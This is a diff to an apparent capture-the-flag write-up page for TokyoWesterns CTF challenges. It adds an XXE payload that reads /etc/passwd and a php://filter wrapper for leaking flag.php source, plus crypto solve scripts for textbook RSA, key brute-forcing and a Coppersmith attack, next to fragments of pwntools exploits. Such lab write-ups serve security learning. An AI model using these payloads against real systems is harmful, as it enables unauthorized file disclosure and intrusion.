@@ -510,8 +510,7 @@ print hex(libc)
 <span class="hljs-built_in">free</span>(<span class="hljs-string">"m"</span>)
 
 
-r.interactive()
-</code></pre><h3 id="multi-heap"><a class="header-link" href="#multi-heap"></a>Multi Heap</h3>
+r.interactive()</code></pre><h3 id="multi-heap"><a class="header-link" href="#multi-heap"></a>Multi Heap</h3>
 <pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 
 <span class="hljs-comment">#r = process("./multi_heap")</span>
@@ -679,6 +678,19 @@ r.interactive()
         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 }</code></pre><h2 id="web"><a class="header-link" href="#web"></a>web</h2>
 <h3 id="j2x2j"><a class="header-link" href="#j2x2j"></a>j2x2j</h3>
+<p>We could easily come out that there sould be a XXE vuln and the payload below would expose the issue.</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span>
+   <span class="hljs-tag">&lt;<span class="hljs-name">core</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"test101"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>John, Doe<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>I love XML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">category</span>&gt;</span>Computers<span class="hljs-tag">&lt;/<span class="hljs-name">category</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span>2018-10-01<span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>
+   <span class="hljs-tag">&lt;/<span class="hljs-name">core</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span></code></pre><p>After some basic directory brute-forcing, <code>flag.php</code> could be found as our target. However, directly reading the php file results in xml parser error, caused by some string like <code>&lt;?php</code>. A base64 php wrapper would help to solve the problem <code>php://filter/read=convert.base64-encode/resource=./flag.php</code></p>
 <h3 id="php-note"><a class="header-link" href="#php-note"></a>PHP Note</h3>
 <h4 id="recon"><a class="header-link" href="#recon"></a>Recon</h4>
 <p>Source code:</p>
@@ -1404,8 +1416,128 @@ print f1+f2
 
 <span class="hljs-comment">#TWCTF{Fat3_Gr4nd_Ord3r_1s_fuck1n6_h07}</span></code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>crypto</h2>
 <h3 id="real-baby-rsa"><a class="header-link" href="#real-baby-rsa"></a>real-baby-rsa</h3>
+<p>Build a dictionary of all encrypted characters then you can rebuild the flag.</p>
+<p>Script:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+
+<span class="hljs-comment"># Public Parameters</span>
+N = <span class="hljs-number">36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091</span>
+e = <span class="hljs-number">65537</span>
+
+ciphers = {}
+
+<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+    ciphers[pow(c, e, N)] = chr(c)
+
+data = open(<span class="hljs-string">'./output'</span>).read().strip().split(<span class="hljs-string">'\n'</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.join([ciphers[int(a)] <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> data])</code></pre><p>Flag: <code>TWCTF{padding_is_important}</code></p>
 <h3 id="simple-logic"><a class="header-link" href="#simple-logic"></a>Simple Logic</h3>
-<h3 id="happy!"><a class="header-link" href="#happy!"></a>Happy!</h3>
+<p>the script given:</p>
+<pre class="hljs"><code>
+ROUNDS = <span class="hljs-number">765</span>
+BITS = <span class="hljs-number">128</span>
+PAIRS = <span class="hljs-number">6</span>
+
+def encrypt(msg, <span class="hljs-type">key</span>)
+    enc = msg
+    mask = (<span class="hljs-number">1</span> &lt;&lt; BITS) - <span class="hljs-number">1</span>
+    ROUNDS.times do
+        enc = (enc + <span class="hljs-type">key</span>) &amp; mask
+        enc = enc ^ <span class="hljs-type">key</span>
+    end
+    enc
+end
+
+flag = SecureRandom.bytes(BITS / <span class="hljs-number">8</span>).unpack1('H*').to_i(<span class="hljs-number">16</span>)
+<span class="hljs-type">key</span> = SecureRandom.bytes(BITS / <span class="hljs-number">8</span>).unpack1('H*').to_i(<span class="hljs-number">16</span>)
+
+STDERR.puts <span class="hljs-string">"The flag: TWCTF{%x}"</span> % flag
+STDERR.puts <span class="hljs-string">"Key=%x"</span> % <span class="hljs-type">key</span>
+STDOUT.puts <span class="hljs-string">"Encrypted flag: %x"</span> % encrypt(flag, <span class="hljs-type">key</span>)
+fail unless decrypt(encrypt(flag, <span class="hljs-type">key</span>), <span class="hljs-type">key</span>) == flag # Decryption Check
+
+PAIRS.times do |i|
+    plain = SecureRandom.bytes(BITS / <span class="hljs-number">8</span>).unpack1('H*').to_i(<span class="hljs-number">16</span>)
+    enc = encrypt(plain, <span class="hljs-type">key</span>)
+    STDOUT.puts <span class="hljs-string">"Pair %d: plain=%x enc=%x"</span> % [-~i, plain, enc]
+end
+# the output is redirected to para.txt</code></pre><p>it&#39;s easy to see that we can bruteforce the key from lower bits to higher bits.</p>
+<p>solution:</p>
+<pre class="hljs"><code>
+from Crypto.Util.<span class="hljs-keyword">number</span> import *
+nbits = <span class="hljs-number">128</span>
+rounds = <span class="hljs-number">765</span>
+
+def encrypt(msg, key):
+    mask = (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">128</span>) - <span class="hljs-number">1</span>
+    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(rounds):
+        msg = (msg + key) &amp; mask
+        msg ^= key
+    <span class="hljs-keyword">return</span> msg
+
+def decrypt(msg, key):
+    mask = (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">128</span>) - <span class="hljs-number">1</span>
+    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(rounds):
+        msg ^= key
+        msg = (msg - key) &amp; mask
+    <span class="hljs-keyword">return</span> msg
+
+with <span class="hljs-keyword">open</span>(<span class="hljs-string">'para.txt'</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">f</span>:
+    <span class="hljs-keyword">x</span> = <span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>().strip().<span class="hljs-keyword">split</span>(<span class="hljs-string">'\n'</span>)
+
+plains, encs = [], []
+<span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
+    now = <span class="hljs-keyword">x</span>[i].<span class="hljs-keyword">split</span>(<span class="hljs-string">':'</span>)[<span class="hljs-number">1</span>].strip().<span class="hljs-keyword">split</span>(<span class="hljs-string">' '</span>)
+    exec(now[<span class="hljs-number">0</span>])
+    exec(now[<span class="hljs-number">1</span>])
+    plains.<span class="hljs-keyword">append</span>(plain)
+    encs.<span class="hljs-keyword">append</span>(enc)
+
+<span class="hljs-keyword">print</span> (plains)
+<span class="hljs-keyword">print</span> (encs)
+
+nows = [<span class="hljs-string">''</span>]
+<span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">129</span>):
+    tmp_now = []
+    <span class="hljs-keyword">for</span> now in now<span class="hljs-variable">s:</span>
+        <span class="hljs-keyword">for</span> poss in <span class="hljs-string">'01'</span>:
+            now_key = poss + now
+            now_key = <span class="hljs-keyword">int</span>(now_key, <span class="hljs-number">2</span>)
+
+            # <span class="hljs-keyword">sign</span> means this now_key <span class="hljs-keyword">is</span> possible choice
+            <span class="hljs-keyword">sign</span> = True
+            <span class="hljs-keyword">for</span> pair in zip(plains, encs):
+                enc = encrypt(pair[<span class="hljs-number">0</span>], now_key)
+                enc ^= pair[<span class="hljs-number">1</span>]
+                mask = (<span class="hljs-number">1</span>&lt;&lt;(i+<span class="hljs-number">1</span>)) - <span class="hljs-number">1</span>
+                <span class="hljs-keyword">if</span> enc &amp; mask != <span class="hljs-number">0</span>:
+                    <span class="hljs-keyword">sign</span> = False
+                    <span class="hljs-keyword">break</span>
+
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">sign</span>:
+                tmp_now.<span class="hljs-keyword">append</span>(poss+now)
+    nows = tmp_now
+
+<span class="hljs-keyword">print</span> (nows)
+
+<span class="hljs-keyword">for</span> now in now<span class="hljs-variable">s:</span>
+    now_key = <span class="hljs-keyword">int</span>(now, <span class="hljs-number">2</span>)
+    <span class="hljs-keyword">print</span> (now_key)
+    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
+        assert encrypt(plains[i], now_key) == encs[i]
+        assert decrypt(encs[i], now_key) == plains[i]
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'pass!'</span>)
+flag = <span class="hljs-number">0</span>x43713622de24d04b9c05395bb753d437
+<span class="hljs-keyword">for</span> now in now<span class="hljs-variable">s:</span>
+    now_key = <span class="hljs-keyword">int</span>(now, <span class="hljs-number">2</span>)
+    <span class="hljs-keyword">pt</span> = decrypt(flag, now_key)
+    <span class="hljs-keyword">print</span> (<span class="hljs-string">'flag : '</span>, <span class="hljs-string">'TWCTF{'</span> + hex(<span class="hljs-keyword">pt</span>)[<span class="hljs-number">2</span>:].rstrip(<span class="hljs-string">'L'</span>) + <span class="hljs-string">'}'</span>)</code></pre><h3 id="happy!"><a class="header-link" href="#happy!"></a>Happy!</h3>
+<p>We are given <code>n</code>, <code>e = 65537</code> and <code>cf = p^(-1) mod q^k</code>. By observing the number of bits of <code>cf</code> and <code>n</code>, we can guess <code>k = 2</code>, and <code>n = p*q^2</code>. Note that <code>p</code> is a solution of <code>f(x) = x^2 - cf^(-1)*x</code>, we can recover <code>p</code> by:</p>
+<pre class="hljs"><code>cf_inv = inverse_mod(cf, n)
+F.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="hljs-string">'NTL'</span>)
+f = (x**<span class="hljs-number">2</span>) - cf_inv*x
+roots = f.small_roots()
+print(roots) <span class="hljs-comment"># [0, p]</span></code></pre><p>Then we calculate <code>q = sqrt(n/p)</code> and decrypt the ciphertext. Flag: <code>TWCTF{I_m_not_sad__I_m_happy_always}</code></p>
 <h3 id="m-poly-cipher"><a class="header-link" href="#m-poly-cipher"></a>M-Poly-Cipher</h3>
 <p>The program looks like:</p>
 <pre class="hljs"><code>Create-key:
